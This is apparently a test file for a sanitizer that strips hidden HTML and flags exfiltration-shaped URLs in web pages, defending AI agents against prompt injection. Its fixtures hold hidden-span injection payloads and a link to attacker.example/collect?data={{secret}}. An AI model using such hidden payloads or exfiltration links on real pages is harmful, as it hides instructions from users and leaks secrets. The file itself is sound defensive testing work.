import assert from 'node:assert/strict';
import { describe, test } from 'node:test';
import type { Ctx } from '../../src/html-cleaner-pipeline/html-to-markdown-pipeline.ts';
import { PromptInjectionRemoverSanitizer } from '../../src/html-cleaner-pipeline/prompt-injection-remover/prompt-injection-remover-sanitizer.ts';

function createContext(html: string, overrides: Partial<Ctx> = {}): Ctx {
  return {
    requestedUrl: 'https://example.com/',
    finalUrl: 'https://example.com/',
    html,
    removed: 0,
    skipped: 0,
    ...overrides,
  };
}

describe('Known HTML sanitizer parsing', () => {
  const sanitizer = new PromptInjectionRemoverSanitizer();

  const hiddenSpan = '<span style="position:absolute;left:-9999px">hidden payload</span>';
  const fencedPayload = ['', '', '```', hiddenSpan, '```', ''].join('\n');
  const plainLines = Array.from({ length: 20 }, (_, index) => `Visible line ${index}`).join('\n');
  const taggedLines = Array.from({ length: 20 }, (_, index) => `<p>Visible line ${index}</p>`).join('\n');
  const htmlInputs = [
    ['complete document with few tags', [
      '<!doctype html>',
      '<html>',
      '<head><title>Page</title></head>',
      '<body>',
      `${plainLines}${fencedPayload}</body>`,
      '</html>',
    ].join('\n')],
    ['short complete document', `<html><body>${fencedPayload}</body></html>`],
    ['long complete document with many tags', `<html>\n<body>\n${taggedLines}${fencedPayload}</body>\n</html>`],
    ['short fragment', `Visible content${fencedPayload}`],
    ['long fragment with few tags', `${plainLines}${fencedPayload}`],
    ['long fragment with many tags', `${taggedLines}${fencedPayload}`],
  ] as const;

  for (const [name, html] of htmlInputs) {
    test(`removes fenced hidden HTML from a ${name}`, async () => {
      const result = await sanitizer.invoke(createContext(html));

      assert.doesNotMatch(result.html, /hidden payload|left:-9999px/);
      assert.equal(result.html, html.replace(hiddenSpan, ''));
      assert.deepEqual(result.found, ['hidden-html']);
      assert.equal(result.skipped, 1);
      assert.deepEqual(result.warnings, [
        'HTML sanitized: 1 hidden element(s) replaced with placeholders',
      ]);
    });
  }

  test('keeps visible Markdown markers and escaped HTML examples as source text', async () => {
    const visible = [
      plainLines,
      '\n\n```',
      '**Visible emphasis** and `visible backticks`',
      '&lt;span hidden&gt;encoded example&lt;/span&gt;',
      '<!-- hidden comment -->',
      '<span hidden>hidden payload</span>',
      '```',
    ].join('\n');
    const result = await sanitizer.invoke(createContext(visible));

    assert.equal(result.html, visible
      .replace('<!-- hidden comment -->', '')
      .replace('<span hidden>hidden payload</span>', ''));
    assert.deepEqual(result.found, ['html-comments', 'hidden-html']);
  });

  test('keeps genuine HTML pre and code text and removes hidden child elements', async () => {
    const html = [
      '<pre><code>```',
      '**literal emphasis**',
      '&lt;span hidden&gt;code example&lt;/span&gt;',
      '<span hidden>hidden payload</span>',
      '```</code></pre>',
    ].join('\n');
    const result = await sanitizer.invoke(createContext(html));

    assert.equal(result.html, html.replace('<span hidden>hidden payload</span>', ''));
    assert.deepEqual(result.found, ['hidden-html']);
  });

  test('reports URLs before removing hidden HTML and preserves resource warnings', async () => {
    const html = [
      plainLines,
      '',
      '```',
      '<span hidden><a href="https://attacker.example/collect?data={{secret}}">hidden payload</a></span>',
      '```',
      '<script>visible script text</script>',
    ].join('\n');
    const result = await sanitizer.invoke(createContext(html, {
      skipped: 4,
      found: ['existing-finding'],
      warnings: ['existing warning'],
    }));

    assert.doesNotMatch(result.html, /hidden payload|attacker\.example/);
    assert.match(result.html, /<script>visible script text<\/script>/);
    assert.deepEqual(result.found, ['existing-finding', 'hidden-html', 'exfil-urls']);
    assert.equal(result.skipped, 6);
    assert.equal(result.warnings?.[0], 'existing warning');
    assert.ok(result.warnings?.some((warning) => warning.includes('script')));
    assert.ok(result.warnings?.some((warning) => warning.startsWith('Exfil-shaped URLs detected:')));
  });
});
